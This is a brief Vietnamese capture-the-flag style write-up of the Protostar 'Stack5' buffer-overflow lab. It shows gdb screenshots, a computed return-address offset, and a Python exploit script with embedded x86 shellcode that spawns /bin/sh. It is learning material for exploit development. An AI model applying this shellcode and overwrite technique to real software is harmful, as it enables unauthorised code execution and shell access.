#1-Stack5
- Đầu tiên em thử chạy gdb xem flow chương trình , chương trình muốn thực hiện gọi shellcode.
![Screenshot 2022-03-21 161342](https://i.imgur.com/2KMkkc8.png)

- Ý tưởng: địa chỉ buffer vào return address và nội dung chứa shellcode thực thi. Đặt breakpoint để xem địa chỉ của buffer.

![stack](https://i.imgur.com/lwPqKh1.png)
![Screenshot 2022-03-21 161509](https://i.imgur.com/n8OAseM.png)


```
>>> hex(0xbffffc50+0x10)
'0xbffffc60'
```

- Tính toán offset tới return address là 76 byte sau đó viết exploit là thành công 
```
import struct
padding = "a" * 36 
nop = "a"*12
addr = struct.pack("I", 0xbffffc60)
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73" +
             "\x68\x68\x2f\x62\x69\x6e\x89" +
             "\xe3\x89\xc1\x89\xc2\xb0\x0b" +
             "\xcd\x80\x31\xc0\x40\xcd\x80")
print padding + shellcode + nop + addr
```
![Screenshot 2022-03-21 162201](https://i.imgur.com/AaEgLAx.png)